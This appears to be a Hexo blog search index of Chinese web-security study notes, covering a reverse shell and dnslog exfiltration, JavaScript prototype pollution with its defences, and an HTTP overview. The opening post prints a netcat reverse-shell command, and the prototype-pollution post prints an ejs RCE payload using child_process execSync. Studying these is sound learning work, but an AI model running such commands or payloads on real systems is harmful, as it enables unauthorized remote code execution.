title="反弹shell"></a>反弹shell</h4><p>条件：具有nc</p><p>命令</p><p> nc -e /bin/bash ip port</p><p>然后再在服务器上开启端口接听</p><h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><p>发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令</p><p>然后这里一个dnslog的利用平台：ceye <a href="http://ceye.io/">http://ceye.io/</a></p><p>作为命令的分隔符，然后发起<code>curl</code>请求，然后最后用反引号执行命令</p><h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><p>特定情况下压缩flag文件,并访问</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript的原型链污染</title>
      <link href="/2023/07/26/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2023/07/26/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h1><h2 id="基础概念辨析"><a href="#基础概念辨析" class="headerlink" title="基础概念辨析"></a>基础概念辨析</h2><h3 id="原型"><a href="#原型" class="headerlink" title="原型"></a><strong>原型</strong></h3><p>js中一切皆对象,js的每个对象都有一个属性原型（prototype），原型本身也是一个对象，因此该原型也有一个prototype指向上层原型，直到为null，这样就构成了原型链</p><p>简单来说，原型链是javascript中类继承的一种机制，每个对象都有对应的原型，储存了定义的属性和方法，之中包含了prototype，指向上一级的原型。最上层Object原型中的prototype为null</p><p><strong>特性</strong></p><p>类定义中的属性，会在创建对象时在对象中创建，类定义的方法而是存在于原型之中。当使用没有定义的属性和方法时，就会顺着原型链一直寻找，直到为undefined,用此来实现继承，子类能用父类的属性和方法</p><p>示例</p><pre class="language-none"><code class="language-none">function Person(name) {       this.name = name;   }   Person.prototype.greet = function () {       console.log(`Hello, my name is ${this.name}`);   };   const person1 = new Person('Alice');   person1.greet(); // 输出 "Hello, my name is Alice"</code></pre><p><img src="/./js.jpg" alt="img"></p><p>​<em>person1对象原型对象展示</em></p><p><strong>prototype与__proto__</strong></p><p>(1)所有引用类型（函数，数组，对象）都拥有<code>__proto__</code>属性（隐式原型）,用来查看其原型</p><p>(2)所有函数拥有<code>prototype</code>属性（显式原型）（仅限函数）</p><p> 简单来说，<strong>proto</strong> 属性是指向该对象的原型，而 prototype属性是用于创建该对象的构造函数的原型。</p><h3 id="Function-与function"><a href="#Function-与function" class="headerlink" title="Function 与function"></a>Function 与function</h3><p>function是一个定义函数的关键字，Function是代表所有函数的内置原型对象</p><p>每一个js 的function都是Function对象，Function是js内置对象，用以实现很多基本功能，如Nunmber,toString</p><p>constructor是一个对象数据属性属性,创建对象后，访问constructor属性，可以返回构造该对象的来源（不是该对象的原型链上级）</p><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p>new constructor[([arguments])]</p><p>参数</p><p><code>constructor</code></p><p>一个指定对象实例的类型的类或函数。</p><p>描述</p><p><code>new</code> 关键字会进行如下的操作：</p><ol><li>创建一个空的简单 JavaScript 对象（即 <code>{}</code>）；</li><li>为步骤 1 新创建的对象添加属性 <code>__proto__</code>，将该属性链接至构造函数的原型对象；</li><li>将步骤 1 新创建的对象作为 <code>this</code> 的上下文；</li><li>如果该函数没有返回对象，则返回 <code>this</code>。</li></ol><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>当我们添加或者修改上层原型的一些属性，子类都又调用该恶意属性时，子类调用的属性已经被我们篡改，造成原型链污染，原型链污染可能会造成命令执行(rce)或者任意文件读取,越权等等</p><p>示例</p><pre class="language-none"><code class="language-none">function merge(target, source) {      for (let key in source) {          if (key in source &amp;&amp; key in target) {              // 如果target与source有相同的键名 则让target的键值为source的键值              merge(target[key], source[key])          } else {              target[key] = source[key]  // 如果target与source没有相通的键名 则直接在target新建键名并赋给键值          }      }  }  let o1 = {}  let o2 = JSON.parse('{ "a": 1, "__proto__": { "b": 2} }');  merge(o1, o2)  console.log(o1.a, o1.b)  o3 = {}  console.log(o3.b)</code></pre><p>漏洞点</p><p>一般对对象进行复制拷贝,如merge函数或者copy函数，会将传入的json数据拷贝至已创建对象，此时可能会产生原型链污染</p><h4 id="ejs模板基于原型链污染的rce"><a href="#ejs模板基于原型链污染的rce" class="headerlink" title="ejs模板基于原型链污染的rce"></a>ejs模板基于原型链污染的rce</h4><p>直接上POC</p><pre class="language-none"><code class="language-none">a; return global.process.mainModule.constructor._load('child_process').execSync('whoami'); //</code></pre><p>参考学习：<a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>对于<code>toUpperCase()</code>函数</p><pre class="language-none"><code class="language-none">字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"</code></pre><p>对于<code>toLowerCase</code></p><pre class="language-none"><code class="language-none">字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)</code></pre><p>详情可见p神的文章<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com</a></p><p>python中也存在原型链污染</p><p>可参考文章：<a href="https://tttang.com/archive/1876">https://tttang.com/archive/1876</a></p><p>ctf例题：<a href="https://chenlvtang.top/2021/08/17/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%AE%9E%E8%B7%B5">https://chenlvtang.top/2021/08/17/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%AE%9E%E8%B7%B5</a></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>1.Object.freeze()冻结原型</p><pre class="language-none"><code class="language-none">Object.freeze(Object.prototype);Object.freeze(Object)</code></pre><p>冻结原型后，无法添加新的原型至原型链</p><p>2.对JSON输入验证</p><p>npm上有很多库，如avj，可以对JSON数据验证，排除json中数据中不需要的属性</p><p>或者在复制对象时，遍历键名时候，检查__proto__和prototype</p><p>3.使用map代替{}</p><p>4.使用Object.create()安全创建对象</p><p>这样创建的对象没有属性</p><p>5.node.js中可以通过disable-proto直接禁止操作原型链</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http概述</title>
      <link href="/2023/07/20/http%E6%A6%82%E8%BF%B0/"/>
      <url>/2023/07/20/http%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<hr><ul><li><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>​Web 使用一种名为 HTTP（超文本传输协议 ）的协议作为规范，完成从客户端到服务器端等一系列运作流 程。而协议是指规则的约定。Web 是建立在 HTTP 协议上通 信的。 http协议主要是计算机网络系统上的应   用层。</p></li><li><h4 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h4><h5 id="主要内容："><a href="#主要内容：" class="headerlink" title="主要内容："></a>主要内容：</h5></li></ul><pre class="language-none"><code class="language-none">应用层：FTP（文件传输协议）和DNS（域名系统）和http协议传输层：TCP（传输控制协议）和UDP（用户数据报协议）网络层：处理在网络上流动的数据包 链路层：处理连接网络的硬件部分 </code></pre><ul><li><h4 id="IP、TCP和DNS："><a href="#IP、TCP和DNS：" class="headerlink" title="IP、TCP和DNS："></a>IP、TCP和DNS：</h4></li></ul><pre class="language-none"><code class="language-none">**IP**IP地址：指明被分配的地址MAC地址：指网卡所属固定的地址运作方式：利用IP指明目标，中转时利用下一站中转设备的MAC地址搜素下一个中转目标。利用ARP协议可以根据IP地址解析出MAC地址。**TCP**TCP提供字节流服务，把数据分割，并通过带SYN/ACK的数据包（三次）确定是否最终传送到对方。**DNS**提供域名和IP之间解析服务</code></pre><ul><li><h4 id="URI和URL"><a href="#URI和URL" class="headerlink" title="URI和URL"></a>URI和URL</h4><p>​URI：是由某个协议方案表示的资源的定位标识符</p><p>​URL:是使用 Web 浏览器等 访问 Web 页面时需要输入的网页地址 </p><p>​URI格式：协议方案名+登录信息（认证）+服务器地址+服务器端口号+带层次的文件路径+查询字符串+片段标识符如：<a href="http://user:pass@www.example.jp/dir/index.htm?uid=1#ch1">http://user:pass@www.example.jp:80/dir/index.htm?uid=1#ch1</a></p><p>​</p></li></ul><p></p><h3 id="简单的http协议"><a href="#简单的http协议" class="headerlink" title="简单的http协议"></a>简单的http协议</h3><hr><p>HTTP 协议规定，请求从客户端发出，最后服务器端响应该请求并返回。</p><p>​ <strong>请求报文</strong>：主要由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成。</p><p>​<strong>响应报文</strong>：基本由协议版本、状态码（表示请求成功或失败的数字代码）、用以解释状态码的原因短语、可选的响应首部字段以及实体构成。 </p><h5 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h5><pre class="language-none"><code class="language-none">**GET: 获取资源**GET方法用来请求访问已被 URI 识别的资源**POST: 传输实体主体****PUT： 传输文件**由于PUT方法自身不带验证机制，存在安全性问题，一般的 Web 网站不使用该方法**HEARD ：获取报文首部**不返回报文主体部分。用于确认URI的有效性及资源更新的日期时间等**DELETE： 删除文件****OPTIONS： 查询支持方法**用来查询针对URI指定的资源支持的方法**TRACE: 追踪路径**让 Web 服务器端将之前的请求通信环回给客户端的方法。客户端通过 TRACE 方法可以查询发送出去的请求是怎样被加工修改/篡改的。容易引发XST攻击**CONNECT：要求用隧道协议连接代理**方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行 TCP 通信。主要使用 SSL（安全套接层）和 TLS（传输层安全）协议把通信内容加密后经网络隧道传输。</code></pre><p>​管线化：利用持久化连接，发送请求后不用等待回应就可直接发送下一个请求。</p><p>​<strong>Cookie</strong>:通常用于判断两个请求是否来自同一浏览器，Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态 。</p><h3 id="http报文"><a href="#http报文" class="headerlink" title="http报文"></a>http报文</h3><hr><h4 id="HTTP信息"><a href="#HTTP信息" class="headerlink" title="HTTP信息"></a>HTTP信息</h4><p>​首部内容：请求行、状态行、首部字段</p><p>​报文：是 HTTP 通信中的基本单位，由 8 位组字节流组成，通过 HTTP 通信传输。 </p><p>​实体：作为请求或响应的有效载荷数据（补充项）被传输，其内容由实 体首部和实体主体组成。 </p><p>​常见压缩传输的内容编码：gzip、compress、deflate、identity</p><h5 id="多部分对象集合"><a href="#多部分对象集合" class="headerlink" title="多部分对象集合"></a>多部分对象集合</h5><ul><li><p>multipart/form-data</p><p>​web表单文件上传时使用</p></li><li><p>multipart/byteranges</p><p>​状态码206响应报文包含了多个范围的内容时使用</p><p>获取部分内容的范围请求：用到首部字段Range来指定资源的byte范围</p><p>内容协商技术：服务器驱动协商、客户端驱动协商、透明协商</p></li></ul><h3 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h3><hr><h5 id="状态码类别"><a href="#状态码类别" class="headerlink" title="状态码类别"></a>状态码类别</h5><table><thead><tr><th></th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1XX</td><td>信息性状态码</td><td>接收的请求正在处理</td></tr><tr><td>2XX</td><td>成功状态码</td><td>请求正常处理完毕</td></tr><tr><td>3XX</td><td>重向状态码</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4XX</td><td>客户端错误状态码</td><td>服务器无法处理请求</td></tr><tr><td>5XX</td><td>服务器错误状态码</td><td>服务器处理出错</td></tr></tbody></table><h5 id="14种常见的状态码"><a href="#14种常见的状态码" class="headerlink" title="14种常见的状态码"></a>14种常见的状态码</h5><pre class="language-none"><code class="language-none">**200 OK**请求被正常处理**204 No Content**请求已成功处理，但响应报文中不含实体的主体部分，也不允许返回任何实体的主体**206 Partial Content**客户端进行了范围请求，服务器成功执行请求，响应报文中包含由Content-Range指定范围的实体范围**301 Moved Permanently**永久性定向。--请求的资源已经被分配到了新的URI**302 Found**临时性重定向。**303 See Other**表示请求对应的资源存在另一个URI，应使用GET方法定向获取请求资源**304 Not Modified**无需再次传输请求的内容，可以使用缓存的内容。**307 Temporary Redirect**临时重定向,保持原有信息**400 Bad Request**报文中存在语法错误，需要修改请求重新发送**401 Unauthorized**表示发送请求需要有通过HTTP认证的认证信息，若之前进行过1次请求，则表示用户认证失败**403 Forbidden请求资源的访问被服务器拒绝**404 Not Found**服务器上无法找到请求的资源**500 Internal Server Error**服务器在执行请求时发生了错误，也有可能是Web应用存在的bug或临时的故障**503 Service Unavailable**服务器暂时处于超负载或正在进行停机维护，现在无法处理请求</code></pre><h3 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h3><hr><h4 id="通信数据转发程序"><a href="#通信数据转发程序" class="headerlink" title="通信数据转发程序"></a>通信数据转发程序</h4><pre class="language-none"><code class="language-none">**代理**作为客户端和服务器的‘中间人’缓存代理：会预先把资源的副本（缓存）保存在代理服务器上透明代理：转发请求或响应时，不对报文做任何加工代理**网关**转发来自其他服务器通信数据的服务器，对客户端的请求进行处理网关可以使通信线路上的服务器提供非HTTP协议服务，提高安全性。**隧道**是在相隔甚远的客户端和服务器之间进行中转，并保持双方通信连接的应用程序目的是为了进行安全的通信</code></pre><h5 id="http出现之前的协议"><a href="#http出现之前的协议" class="headerlink" title="http出现之前的协议"></a>http出现之前的协议</h5><p>​FTP:传输文件时使用的协议</p><p>​NNTP：用于 NetNews 电子会议室内传送消息的协议 </p><p>​Archie ：搜索 anonymous FTP 公开的文件信息的协议 </p><p>​WAIS ：以关键词检索多个数据库使用的协议 </p><p>​Gopher ：查找与互联网连接的计算机内信息的协议 </p><h3 id="HTTP首部"><a href="#HTTP首部" class="headerlink" title="HTTP首部"></a>HTTP首部</h3><p>​首部字段结构：手段字段名：字段值</p><h5 id="通用首部"><a href="#通用首部" class="headerlink" title="通用首部"></a>通用首部</h5><pre class="language-none"><code class="language-none">**Cache-Control 控制缓存的行为**指令:public 表明其他用户也可利用缓存 private 响应只能以特殊用户作为对象 no-cache 用户端不接受缓存过的响应，缓存服务器不能进行缓存 no-store 表明请求和响应中包含机密信息，不能进行缓存 s-maxage=...（秒）    指定缓存期限和认证的指令 min-fresh=...（秒）指示客户端允许存储的响应至少 N 秒是新鲜的 max-stale=...（秒）可指示缓存资源，处于指定范围内，过期也可以接受。 only-if-cached客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回 must—revalidate代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。 proxy-revalidate缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性 no-transform 缓存都不能改变实体主体的媒体类型 **Connection 逐跳首部、连接的管理**指令close 服务器想断开连接 Keep-Alive 旧版本http协议实现持久化连接**Date 创建报文的日期时间**格式：如Tue, 03 Jul 2012 04:40:59 GM或者Tue Jul 03 04:40:59 2012**Pragma 报文指令**指令：no-cache 只在客户端请求中，所有中间服务器不返回缓存资源**Trailer 报文末端的首部一览**允许发送方在分块发送的消息后面添加额外的元信息**Transfer-Encoding 指定报文主体的传输编码方式****Upgrade 升级为其他协议****Via 代理服务器的相关信息**追踪报文传输路径**Warning 错误通知**格式：[警告码][警告的主机:端口号]“[警告内容]”([日期时间])</code></pre><h5 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h5><pre class="language-none"><code class="language-none">首部字段名 说明**Accept 用户代理可处理的媒体类型**q=（0-1）用来权衡优先级，默认为1，前用；间隔**Accept-Charset 优先的字符集****Accept-Encoding 优先的内容编码**内容编码优先级**Accept-Language 优先的语言（自然语言）****Authorization Web认证信息****Expect 期待服务器的特定行为**错误返回状态码417 Expectation Failed**From 用户的电子邮箱地址****Host 请求资源所在服务器****If-Match 比较实体标记（ETag）**If-xxx 为条件请求，条件为真时执行*If-Modified-Since 比较资源的更新时间*如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应**If-None-Match 比较实体标记（与 If-Match 相反）****If-Range 资源未更新时发送实体 Byte 的范围请求**If-Unmodified-Since 比较资源的更新时间（与If-Modified-Since相反）如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。**Max-Forwards 最大传输逐跳数**当值为0时，经过的服务器不在进行转发，直接返回响应**Proxy-Authorization 代理服务器要求客户端的认证信息****Range 实体的字节范围请求****Referer 对请求中URI的原始获取方****TE 传输编码的优先级****User-Agent 客户端程序的信息**将创建的请求的浏览器和用户代理名称等信息传达给服务器</code></pre><h5 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h5><pre class="language-none"><code class="language-none">首部字段名    说明**Accept-Ranges 是否接受字节范围请求****Age 推算资源创建经过时间****ETag 资源的匹配信息**用户端实体标识**Location 令客户端重定向至指定URI****Proxy-Authenticate 代理服务器对客户端的认证信息**服务器是安装http服务器的应用程序是信息**Retry-After 对再次发起请求的时机要求****Server     HTTP服务器的安装信息**服务器是安装http服务器的应用程序是信息**Vary 代理服务器缓存的管理信息****WWW-Authenticate 服务器对客户端的认证信息**http访问认证</code></pre><h5 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h5><pre class="language-none"><code class="language-none">首部字段名 说明**Allow 资源可支持的HTTP方法****Content-Encoding 实体主体适用的编码方式****Content-Language 实体主体的自然语言****Content-Length 实体主体的大小（单位：字节）****Content-Location 替代对应资源的URI****Content-MD5 实体主体的报文摘要**判断报文的准确性**Content-Range 实体主体的位置范围****Content-Type 实体主体的媒体类型****Expires 实体主体过期的日期时间****Last-Modified 资源的最后修改日期时间**</code></pre><h5 id="为-Cookie-服务的首部字段"><a href="#为-Cookie-服务的首部字段" class="headerlink" title="为 Cookie 服务的首部字段"></a>为 Cookie 服务的首部字段</h5><pre class="language-none"><code class="language-none">**Set-Cookie**expires:浏览器可发送cookie的有效期path：限定cookie发送范围的文件目录domain：指定域名与结尾匹配可发送cookiesecure：web仅在HTTPS时，才发送cookieHttpOnly：使JavaScript无法获取cookie，防止xss攻击对信息的窃取</code></pre><h5 id="其他首部字段"><a href="#其他首部字段" class="headerlink" title="其他首部字段"></a>其他首部字段</h5><pre class="language-none"><code class="language-none">**X-Frame-Options 用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题 **响应首部DENY：拒绝SAMEORIGIN：仅同域名下页面匹配时许可**X-XSS-Protection 于控制浏览器 XSS 防护机制的开关**响应首部0：无效1： 有效**DNT 拒绝个人信息被收集**请求首部0：同意被跟踪1：拒绝被跟踪*P3P 在线隐私偏好平台**</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/07/19/hello-world/"/>
      <url>/2023/07/19/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="第一篇博客"><a href="#第一篇博客" class="headerlink" title="第一篇博客"></a>第一篇博客</h2><p>​不知道怎么看别人大佬的文章都是好看的博客，也非常系统，然后就想建个自己的博客。成功搭建博客系统。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
